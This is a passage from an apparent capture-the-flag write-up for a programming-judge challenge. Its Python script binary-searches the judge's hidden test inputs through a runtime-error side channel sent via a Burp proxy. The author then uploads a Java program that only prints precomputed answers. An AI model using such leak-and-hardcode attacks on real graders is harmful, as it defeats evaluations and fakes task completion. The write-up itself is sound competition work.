</span></span><span style="display:flex;"><span>    a <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(burp0_url, proxies<span style="color:#ff79c6">=</span>proxies,headers<span style="color:#ff79c6">=</span>burp0_headers, data<span style="color:#ff79c6">=</span>burp0_data)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;runtime&#34;</span> <span style="color:#ff79c6">in</span> a<span style="color:#ff79c6">.</span>text:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">True</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(tests):
</span></span><span style="display:flex;"><span>    low, high <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">500000</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">while</span> low <span style="color:#ff79c6">&lt;=</span> high:
</span></span><span style="display:flex;"><span>        mid <span style="color:#ff79c6">=</span> (low <span style="color:#ff79c6">+</span> high) <span style="color:#ff79c6">//</span> <span style="color:#bd93f9">2</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> islargerthan_inputs(i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>,<span style="color:#bd93f9">0</span>,mid):
</span></span><span style="display:flex;"><span>            low <span style="color:#ff79c6">=</span> mid <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>            high <span style="color:#ff79c6">=</span> mid <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;source on line: &#34;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>)<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34; is &#34;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(low))
</span></span><span style="display:flex;"><span>    low, high <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">500000</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">while</span> low <span style="color:#ff79c6">&lt;=</span> high:
</span></span><span style="display:flex;"><span>        mid <span style="color:#ff79c6">=</span> (low <span style="color:#ff79c6">+</span> high) <span style="color:#ff79c6">//</span> <span style="color:#bd93f9">2</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> islargerthan_inputs(i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>,<span style="color:#bd93f9">1</span>,mid):
</span></span><span style="display:flex;"><span>            low <span style="color:#ff79c6">=</span> mid <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>            high <span style="color:#ff79c6">=</span> mid <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;sink case on line: &#34;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>)<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34; is &#34;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(low))
</span></span></code></pre></div><p>you can see them here:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>8
</span></span><span style="display:flex;"><span>0 2
</span></span><span style="display:flex;"><span>1 2
</span></span><span style="display:flex;"><span>300 123
</span></span><span style="display:flex;"><span>1337 1337
</span></span><span style="display:flex;"><span>929 1000
</span></span><span style="display:flex;"><span>1234 9876
</span></span><span style="display:flex;"><span>11 22
</span></span><span style="display:flex;"><span>1000 1001
</span></span></code></pre></div><p>Ok, then lets run the dijkstra.py with the graph and precompute the answers.</p>
<p>











<figure class="">

    <div>
        <img loading="lazy" alt="" src="/posts/dm-i-programmering/3.png" width="2054px" height="436px">
    </div>

    
</figure>
</p>
<p>ok lets create a some java code to just print the answers</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Run</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span>(String<span style="color:#ff79c6">[]</span> args) {
</span></span><span style="display:flex;"><span>        System.<span style="color:#50fa7b">out</span>.<span style="color:#50fa7b">println</span>(147219);
</span></span><span style="display:flex;"><span>        System.<span style="color:#50fa7b">out</span>.<span style="color:#50fa7b">println</span>(106042);
</span></span><span style="display:flex;"><span>        System.<span style="color:#50fa7b">out</span>.<span style="color:#50fa7b">println</span>(101726);
</span></span><span style="display:flex;"><span>        System.<span style="color:#50fa7b">out</span>.<span style="color:#50fa7b">println</span>(0);
</span></span><span style="display:flex;"><span>        System.<span style="color:#50fa7b">out</span>.<span style="color:#50fa7b">println</span>(105053);
</span></span><span style="display:flex;"><span>        System.<span style="color:#50fa7b">out</span>.<span style="color:#50fa7b">println</span>(122070);
</span></span><span style="display:flex;"><span>        System.<span style="color:#50fa7b">out</span>.<span style="color:#50fa7b">println</span>(117948);
</span></span><span style="display:flex;"><span>        System.<span style="color:#50fa7b">out</span>.<span style="color:#50fa7b">println</span>(145889);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>aaaaand upload it</p>
<p>











<figure class="">

    <div>
        <img loading="lazy" alt="" src="/posts/dm-i-programmering/4.png" width="2910px" height="1719px">
    </div>

    
</figure>
</p>
<p>annnnnnndd:</p>
<p>











<figure class="">

    <div>
        <img loading="lazy" alt="" src="/posts/dm-i-programmering/5.png" width="2946px" height="1924px">
    </div>

    
</figure>
</p>
<p>GREAT SUCCESS</p>
<p>(Sorry for this janky shit haha)</p>

    
  </div>

  


  

  
  

<div class="single-pagination">
    <hr />

    <div class="flex">

        <div class="single-pagination-prev">
            
            <div class="single-pagination-container-prev">
                <div class="single-pagination-text">←</div>
                <div class="single-pagination-text">
                    <a href="/posts/filesharing/">
                        TDC NET CTF 2023 - filesharing
                    </a>
                </div>
            </div>
            
        </div>

        <div class="single-pagination-next">
            
            <div class="single-pagination-container-next">
                <div class="single-pagination-text">
                    <a href="/posts/sewkinnect/">
                        TDC NET CTF 2023 - clone2own - sewkinnect
                    </a>
                </div>
                <div class="single-pagination-text">→</div>
            </div>
            
        </div>

    </div>

    <hr />
</div>



  

  

  
  <div class="back-to-top">
    <a href="#top">
      back to top
    </a>
  </div>
  

</div>


    </main>
  </div>

  <footer>
    

    
    <p>Powered by
        <a href="https://gohugo.io/">Hugo</a>
        and
        <a href="https://github.com/tomfran/typo">tomfran/typo</a>
    </p>
    
    
    


  </footer>

  

</body>

<script>

  function isAuto() {
    return document.body.classList.contains("auto");
  }

  function setTheme() {
    if (!isAuto()) {
      return
    }

    document.body.classList.remove("auto");
    let cls = "light";
    if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
      cls = "dark";
    }

    document.body.classList.add(cls);
  }

  function invertBody() {
    document.body.classList.toggle("dark");
    document.body.classList.toggle("light");
  }

  if (isAuto()) {
    window.matchMedia('(prefers-color-scheme: dark)').addListener(invertBody);
  }

  setTheme();

</script>

<script defer src="/js/copy-code.js"></script>
</html>